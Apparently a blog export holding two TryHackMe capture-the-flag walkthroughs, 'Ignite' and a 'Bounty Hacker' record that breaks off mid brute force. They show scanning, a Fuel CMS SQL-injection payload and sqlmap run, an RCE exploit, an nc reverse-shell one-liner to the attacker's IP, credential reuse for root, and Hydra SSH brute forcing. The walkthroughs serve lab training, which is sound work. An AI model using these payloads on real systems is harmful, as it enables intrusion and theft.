[{"content":"Enumeration Host: 10.10.140.200\nAs always, let\u0026rsquo;s start with a quick NMAP (-A) scan against the host\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# nmap -A 10.10.140.200 -Pn -n Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 11:31 PKT Nmap scan report for 10.10.140.200 Host is up (0.19s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open ssl/http Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/fuel/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to FUEL CMS No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/9%OT=80%CT=1%CU=44104%PV=Y%DS=5%DC=T%G=Y%TM=606FF4F1 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10E%TI=Z%II=I%TS=A)SEQ(SP=10 OS:8%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3 OS:=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=6 OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 5 hops TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 61.96 ms 10.17.0.1 2 ... 4 5 182.37 ms 10.10.140.200 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 52.01 seconds   Only, port 80 (HTTP) open. Let\u0026rsquo;s enumerate this port and the web server.\nHTTP - (Port 80) We can see that the web server is hosting Fuel CMS by visiting the port.\n1  http://10.10.140.200/   We can see the version installed (1.4) — Also, if we just scrolldown a little bit, we can see that the getting started page contains credentials in it.\nThe path /fuel/ can also be obtained from /robots.txt which NMAP indicated in the scan.\nCool, we got the login page, let\u0026rsquo;s try the credentials:\nUsername: admin\nPassword: admin\nWe\u0026rsquo;re logged in! Let\u0026rsquo;s see if there are any version specific vulnerabilities of Fuel CMS.\n1 2 3 4 5 6 7 8 9 10 11  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# searchsploit fuel cms --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb Fuel CMS 1.4.7 - \u0026#39;col\u0026#39; SQL Injection (Authenticated) | php/webapps/48741.txt Fuel CMS 1.4.8 - \u0026#39;fuel_replace_id\u0026#39; SQL Injection (Authenticated) | php/webapps/48778.txt --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   We can see multiple exploits for the version (1.4) — Let\u0026rsquo;s utilize the authenticated ones, since we\u0026rsquo;ve the credentials already. php/webapps/48778.txt contains a request body recreating which will take time.\nLet\u0026rsquo;s utilize the second-last exploit (php/webapps/48741.txt)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# searchsploit -x php/webapps/48741.txt Exploit: Fuel CMS 1.4.7 - \u0026#39;col\u0026#39; SQL Injection (Authenticated) URL: https://www.exploit-db.com/exploits/48741  Path: /usr/share/exploitdb/exploits/php/webapps/48741.txt File Type: ASCII text, with very long lines, with CRLF line terminators 2. Proof of Concept: ---------------------- In Burpsuite intercept the request from one of the affected pages with \u0026#39;col\u0026#39; parameter and save it like fuel.req Then run SQLmap to extract the data from the database: sqlmap -r fuel.req --risk=3 --level=5 --dbs --random-agent 3. Example payload: ---------------------- (time-based blind) /fuelcms/pages/items/?search_term=\u0026amp;published=\u0026amp;layout=\u0026amp;limit=50\u0026amp;view_type=list\u0026amp;offset=0\u0026amp;order=asc\u0026amp;col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(5)))ULQV)\u0026amp;fuel_inline=0 4. Burpsuite request: ---------------------- GET /fuelcms/pages/items/?search_term=\u0026amp;published=\u0026amp;layout=\u0026amp;limit=50\u0026amp;view_type=list\u0026amp;offset=0\u0026amp;order=asc\u0026amp;col=location%20AND%20(SELECT%201340%20FROM%20(SELECT(SLEEP(5)))ULQV)\u0026amp;fuel_inline=0 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ci_session=2pvc8gmus9he9fbesp3lkhlbc7oal188; fuel_eeed351bf4de904070ff77c1aef15576=a%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22language%22%3Bs%3A7%3A%22english%22%3B%7D; fuel_ui_eeed351bf4de904070ff77c1aef15576=%2528%257Bleftnav_h3%253A%25220%257C0%257C0%257C0%2522%252C%2520fuel_permissions_items%253A%2522list%2522%252C%2520fuel_pages_items%253A%2522list%2522%252C%2520leftnav_hide%253A%25220%2522%252C%2520tabs_ms_assets_create%253A%25220%2522%252C%2520tabs_ms_assets_create_5a47396a63773d3d%253A%25220%2522%252C%2520tabs_ms_assets_create_5a47396a637939305a584e30%253A%25220%2522%252C%2520tabs_ms_assets_create_615731685a32567a%253A%25220%2522%252C%2520fuel_navigation_items%253A%2522list%2522%257D%2529 Upgrade-Insecure-Requests: 1   Alright, we can see that this one only requires valid Cookies \u0026amp; request URL. We can fetch the cookies from the browser and can use sqlmap for going on ahead.\n1  sqlmap --risk=3 --level=5 --dbs --random-agent --batch --threads 10 -u \u0026#34;http://10.10.140.200/fuel/pages/items?search_term=a\u0026amp;published=\u0026amp;layout=\u0026amp;search=Search\u0026amp;limit=50\u0026amp;view_type=list\u0026amp;offset=0\u0026amp;order=asc\u0026amp;col=location*\u0026amp;fuel_inline=0\u0026#34; --cookie \u0026#39;ci_session=cfgcs6rgfrsqoo2hq067o0huq4ierrmn; fuel_7da515443a82fcacf15d74c766f4b34b=a%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22language%22%3Bs%3A7%3A%22english%22%3B%7D; fuel_ui_7da515443a82fcacf15d74c766f4b34b=%257B%2522leftnav_h3%2522%253A%25220%257C0%257C0%257C0%2522%252C%2522fuel_pages_items%2522%253A%2522list%2522%257D\u0026#39;    You can see that I added a `` after col=location that\u0026rsquo;s for indicating to sqlmap to inject in that parameter.\n Since, the exploit is time-based blind, it\u0026rsquo;ll take a lot of time for it to complete. Let\u0026rsquo;s go through the remaining exploits (remember to try everything always!)\nLet\u0026rsquo;s use the second RCE exploit now:\n1 2 3 4 5 6 7 8 9 10 11  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# searchsploit fuel cms --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb Fuel CMS 1.4.7 - \u0026#39;col\u0026#39; SQL Injection (Authenticated) | php/webapps/48741.txt Fuel CMS 1.4.8 - \u0026#39;fuel_replace_id\u0026#39; SQL Injection (Authenticated) | php/webapps/48778.txt --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   We\u0026rsquo;ll be using php/webapps/49487.rb. Let\u0026rsquo;s copy the exploit to our own directory first and convert it from dos from to unix.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# searchsploit -m php/webapps/49487.rb Exploit: Fuel CMS 1.4.1 - Remote Code Execution (2) URL: https://www.exploit-db.com/exploits/49487  Path: /usr/share/exploitdb/exploits/php/webapps/49487.rb File Type: Ruby script, ASCII text, with CRLF line terminators Copied to: /mnt/hgfs/THM/Ignite/49487.rb ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# dos2unix 49487.rb dos2unix: converting file 49487.rb to Unix format...   It has a dependency issue, let\u0026rsquo;s install it with gem\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# ruby 49487.rb  Traceback (most recent call last): 2: from 49487.rb:14:in `\u0026lt;main\u0026gt;\u0026#39; 1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require\u0026#39; /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require\u0026#39;: cannot load such file -- docopt (LoadError) ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─#  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# gem install docopt 1 ⨯  Fetching docopt-0.6.1.gem Successfully installed docopt-0.6.1 Parsing documentation for docopt-0.6.1 Installing ri documentation for docopt-0.6.1 Done installing documentation for docopt after 0 seconds 1 gem installed   Let\u0026rsquo;s run the exploit now:\n1 2 3  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# ruby 49487.rb http://10.10.140.200 \u0026#34;id\u0026#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   Oh wow, we got rce! Let\u0026rsquo;s use nc to get reverse shell to our own box.\n1 2 3  ┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# ruby 49487.rb http://10.10.140.200 \u0026#34;which%20nc\u0026#34; 1 ⨯ /bin/nc   Exploitation Can URL encode our payload in CyberChef:\n1 2 3  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.17.0.120 5555 \u0026gt;/tmp/f rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%205555%20%3E%2Ftmp%2Ff   Got reverse shell!\nLet\u0026rsquo;s look for flag in /var/www/ and in /home/ directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  www-data@ubuntu:/var/www/html$ ls -la total 52 drwxrwxrwx 4 root root 4096 Jul 26 2019 . drwxr-xr-x 3 root root 4096 Jul 26 2019 .. -rw-r--r-- 1 root root 163 Jul 26 2019 .htaccess -rwxrwxrwx 1 root root 1427 Jul 26 2019 README.md drwxrwxrwx 9 root root 4096 Jul 26 2019 assets -rwxrwxrwx 1 root root 193 Jul 26 2019 composer.json -rwxrwxrwx 1 root root 6502 Jul 26 2019 contributing.md drwxrwxrwx 9 root root 4096 Jul 26 2019 fuel -rwxrwxrwx 1 root root 11802 Jul 26 2019 index.php -rwxrwxrwx 1 root root 30 Jul 26 2019 robots.txt www-data@ubuntu:/var/www/html$ cd .. www-data@ubuntu:/var/www$ ls- la ^C www-data@ubuntu:/var/www$ ^C www-data@ubuntu:/var/www$ ^C www-data@ubuntu:/var/www$ ls -al total 12 drwxr-xr-x 3 root root 4096 Jul 26 2019 . drwxr-xr-x 15 root root 4096 Jul 26 2019 .. drwxrwxrwx 4 root root 4096 Jul 26 2019 html www-data@ubuntu:/var/www$ www-data@ubuntu:/var/www$ www-data@ubuntu:/var/www$ www-data@ubuntu:/var/www$ cd /home/ www-data@ubuntu:/home$ ls -al total 12 drwxr-xr-x 3 root root 4096 Jul 26 2019 . drwxr-xr-x 24 root root 4096 Jul 26 2019 .. drwx--x--x 2 www-data www-data 4096 Jul 26 2019 www-data www-data@ubuntu:/home$ find , ^C www-data@ubuntu:/home$ find . . ./www-data ./www-data/flag.txt www-data@ubuntu:/home$ cd www-data/ www-data@ubuntu:/home/www-data$ ls -al total 12 drwx--x--x 2 www-data www-data 4096 Jul 26 2019 . drwxr-xr-x 3 root root 4096 Jul 26 2019 .. -rw-r--r-- 1 root root 34 Jul 26 2019 flag.txt www-data@ubuntu:/home/www-data$ cat flag.txt 64.......................b www-data@ubuntu:/home/www-data$   Cool, now time for privesc!\nPrivileges Escalation The first thing, after getting a shell is to enumerate local credentials, of DB, .htpasswd, whatever, just grab em all!\nAfter googling, found out that Fuel CMS keeps it\u0026rsquo;s DB configuration files in ../fuel/application/config/database.php\nWe can check the contents of the file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  www-data@ubuntu:/var/www/html/fuel$ cat application/config/database.php \u0026lt;?php defined(\u0026#39;BASEPATH\u0026#39;) OR exit(\u0026#39;No direct script access allowed\u0026#39;); /* | ------------------------------------------------------------------- | DATABASE CONNECTIVITY SETTINGS | ------------------------------------------------------------------- | This file will contain the settings needed to access your database. | | For complete instructions please consult the \u0026#39;Database Connection\u0026#39; | page of the User Guide. | | ------------------------------------------------------------------- | EXPLANATION OF VARIABLES | ------------------------------------------------------------------- | | [\u0026#39;dsn\u0026#39;] The full DSN string describe a connection to the database. | [\u0026#39;hostname\u0026#39;] The hostname of your database server. | [\u0026#39;username\u0026#39;] The username used to connect to the database | [\u0026#39;password\u0026#39;] The password used to connect to the database | [\u0026#39;database\u0026#39;] The name of the database you want to connect to | [\u0026#39;dbdriver\u0026#39;] The database driver. e.g.: mysqli. | Currently supported: | cubrid, ibase, mssql, mysql, mysqli, oci8, | odbc, pdo, postgre, sqlite, sqlite3, sqlsrv | [\u0026#39;dbprefix\u0026#39;] You can add an optional prefix, which will be added | to the table name when using the Query Builder class | [\u0026#39;pconnect\u0026#39;] TRUE/FALSE - Whether to use a persistent connection | [\u0026#39;db_debug\u0026#39;] TRUE/FALSE - Whether database errors should be displayed. | [\u0026#39;cache_on\u0026#39;] TRUE/FALSE - Enables/disables query caching | [\u0026#39;cachedir\u0026#39;] The path to the folder where cache files should be stored | [\u0026#39;char_set\u0026#39;] The character set used in communicating with the database | [\u0026#39;dbcollat\u0026#39;] The character collation used in communicating with the database | NOTE: For MySQL and MySQLi databases, this setting is only used | as a backup if your server is running PHP \u0026lt; 5.2.3 or MySQL \u0026lt; 5.0.7 | (and in table creation queries made with DB Forge). | There is an incompatibility in PHP with mysql_real_escape_string() which | can make your site vulnerable to SQL injection if you are using a | multi-byte character set and are running versions lower than these. | Sites using Latin-1 or UTF-8 database character set and collation are unaffected. | [\u0026#39;swap_pre\u0026#39;] A default table prefix that should be swapped with the dbprefix | [\u0026#39;encrypt\u0026#39;] Whether or not to use an encrypted connection. | | \u0026#39;mysql\u0026#39; (deprecated), \u0026#39;sqlsrv\u0026#39; and \u0026#39;pdo/sqlsrv\u0026#39; drivers accept TRUE/FALSE | \u0026#39;mysqli\u0026#39; and \u0026#39;pdo/mysql\u0026#39; drivers accept an array with the following options: | | \u0026#39;ssl_key\u0026#39; - Path to the private key file | \u0026#39;ssl_cert\u0026#39; - Path to the public key certificate file | \u0026#39;ssl_ca\u0026#39; - Path to the certificate authority file | \u0026#39;ssl_capath\u0026#39; - Path to a directory containing trusted CA certificats in PEM format | \u0026#39;ssl_cipher\u0026#39; - List of *allowed* ciphers to be used for the encryption, separated by colons (\u0026#39;:\u0026#39;) | \u0026#39;ssl_verify\u0026#39; - TRUE/FALSE; Whether verify the server certificate or not (\u0026#39;mysqli\u0026#39; only) | | [\u0026#39;compress\u0026#39;] Whether or not to use client compression (MySQL only) | [\u0026#39;stricton\u0026#39;] TRUE/FALSE - forces \u0026#39;Strict Mode\u0026#39; connections | - good for ensuring strict SQL while developing | [\u0026#39;ssl_options\u0026#39;] Used to set various SSL options that can be used when making SSL connections. | [\u0026#39;failover\u0026#39;] array - A array with 0 or more data for connections if the main should fail. | [\u0026#39;save_queries\u0026#39;] TRUE/FALSE - Whether to \u0026#34;save\u0026#34; all executed queries. | NOTE: Disabling this will also effectively disable both | $this-\u0026gt;db-\u0026gt;last_query() and profiling of DB queries. | When you run a query, with this setting set to TRUE (default), | CodeIgniter will store the SQL statement for debugging purposes. | However, this may cause high memory usage, especially if you run | a lot of SQL queries ... disable this to avoid that problem. | | The $active_group variable lets you choose which connection group to | make active. By default there is only one group (the \u0026#39;default\u0026#39; group). | | The $query_builder variables lets you determine whether or not to load | the query builder class. */ $active_group = \u0026#39;default\u0026#39;; $query_builder = TRUE; $db[\u0026#39;default\u0026#39;] = array( \u0026#39;dsn\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;hostname\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;mememe\u0026#39;, \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;fuel_schema\u0026#39;, \u0026#39;dbdriver\u0026#39; =\u0026gt; \u0026#39;mysqli\u0026#39; ...   We do have the DB credentials, root:mememe\nLet\u0026rsquo;s try using these maybe?\nRoot Shell! We\u0026rsquo;re root! Thanks for reading the walkthrough! Hopefully you enjoyed it 😁\nThings learnt:  Always read the pages of the web application (you might find interesting stuff) Check /robots.txt by default! Try all the exploits! Don\u0026rsquo;t rely on and keep trying only one Enumerate credentials files (if there\u0026rsquo;s a CMS, definitely there\u0026rsquo;s going to be a configuration file)  ","description":"Walkthrough of the machine Ignite on TryHackMe - https://tryhackme.com/room/ignite","id":0,"section":"posts","tags":["tryhackme","http","nmap","fuelcms","sqlmap","rce","privesc"],"title":"TryHackMe - Ignite","uri":"https://umar0x01.sh/posts/ignite-thm/"},{"content":"Enumeration Host: 10.10.56.222\nLet\u0026rsquo;s start with nmap scan against the host and see the ports open on it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] [1/377] └─# nmap -A 10.10.56.222 -Pn -n Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 00:03 PKT Nmap scan report for 10.10.56.222 Host is up (0.21s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt |_-rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.17.0.120 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (88%) No exact OS matches for host (test conditions non-ideal). Network Distance: 5 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 41511/tcp) HOP RTT ADDRESS 1 63.06 ms 10.17.0.1 2 ... 4 5 238.98 ms 10.10.56.222 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds   Alright, we can see three ports open. Let\u0026rsquo;s enumerate the FTP (21) port first.\nFTP - Port (21) No exploits found for the version reported. Let\u0026rsquo;s try anonymous login against the FTP port open.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# ftp 10.10.56.222 21  Connected to 10.10.56.222. 220 (vsFTPd 3.0.3) Name (10.10.56.222:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt 226 Directory send OK. ftp\u0026gt; get locks.txt local: locks.txt remote: locks.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 226 Transfer complete. 418 bytes received in 0.08 secs (5.2431 kB/s) ftp\u0026gt; get task.txt local: task.txt remote: task.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.08 secs (0.8768 kB/s) ftp\u0026gt;   Alright, anonymous login enabled on FTP. Downloaded two files present on it as well.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# cat locks.txt  rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 R3DDr46ONSYndIC@Te ReddRA60N R3dDrag0nSynd1c4te dRa6oN5YNDiCATE ReDDR4g0n5ynDIc4te R3Dr4gOn2044 RedDr4gonSynd1cat3 R3dDRaG0Nsynd1c@T3 Synd1c4teDr@g0n reddRAg0N REddRaG0N5yNdIc47e Dra6oN$yndIC@t3 4L1mi6H71StHeB357 rEDdragOn$ynd1c473 DrAgoN5ynD1cATE ReDdrag0n$ynd1cate Dr@gOn$yND1C4Te RedDr@gonSyn9ic47e REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N ReDSynd1ca7e ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# cat task.txt  1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin   The first file includes passwords and the second some instructions? — Let\u0026rsquo;s pause this for now and move onto HTTP.\nHTTP - Port (80) The site has many usernames in it, maybe we can use cewl to get all the usernames? and use the passwords above to bruteforcing SSH?\nLet\u0026rsquo;s bruteforce later. First, enumerate the local directories on the webserver using gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404 -t 100  =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.56.222 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/08 23:59:34 Starting gobuster in directory enumeration mode =============================================================== http://10.10.56.222/.htaccess (Status: 403) [Size: 277] http://10.10.56.222/.hta (Status: 403) [Size: 277] http://10.10.56.222/.htpasswd (Status: 403) [Size: 277] http://10.10.56.222/images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.56.222/images/] http://10.10.56.222/index.html (Status: 200) [Size: 969] http://10.10.56.222/server-status (Status: 403) [Size: 277] =============================================================== 2021/04/08 23:59:55 Finished ===============================================================   Nothing interesting with common.txt wordlist and no extensions. Let\u0026rsquo;s try with extensions maybe?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t 100 -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.56.222 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: js,zip,key,doc,docx,xml,cgi,jsp,py,jar,sql,groovy,inc,config,php,rb,asp,aspx,tar,txt,html,back,ini,json,yml,conf [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/09 00:00:20 Starting gobuster in directory enumeration mode =============================================================== http://10.10.56.222/images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.56.222/images/] http://10.10.56.222/index.html (Status: 200) [Size: 969] http://10.10.56.222/index.html (Status: 200) [Size: 969] =============================================================== 2021/04/09 00:05:33 Finished ===============================================================    Nothing with that either, let\u0026rsquo;s start another scan with /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt and keep it running in the background and move with cewl against the site.\n Running cewl:\n1 2 3  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# cewl -k -d 10 -w potential-usernames.txt -a -e http://10.10.56.222 1 ⨯ CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)   The running arguments mean:\n -k, --keep: Keep the downloaded file. -d \u0026lt;x\u0026gt;,--depth \u0026lt;x\u0026gt;: Depth to spider to, default 2. -w, --write: Write the output to the file. -a, --meta: include meta data. -e, --email: Include email addresses.  The argument -e wasn\u0026rsquo;t required. Let\u0026rsquo;s now try the list against SSH open on the host.\nAlright, let\u0026rsquo;s try all the things we\u0026rsquo;ve in todo.\n Bruteforce using cewl list against rocks.txt Bruteforce using rocks.txt list against rocks.txt   Bruteforce using cewl list against rocks.txt\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# hydra -L potential-usernames.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:21:23 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 1898 login tries (l:73/p:26), ~119 tries per task [DATA] attacking ssh://10.10.56.222:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://you@10.10.56.222:22 [INFO] Successful, password authentication is supported by ssh://10.10.56.222:22 [ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;rEddrAGON\u0026#34; - 1 of 1898 [child 0] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;ReDdr4g0nSynd!cat3\u0026#34; - 2 of 1898 [child 1] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;Dr@gOn$yn9icat3\u0026#34; - 3 of 1898 [child 2] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;R3DDr46ONSYndIC@Te\u0026#34; - 4 of 1898 [child 3] (0/0) 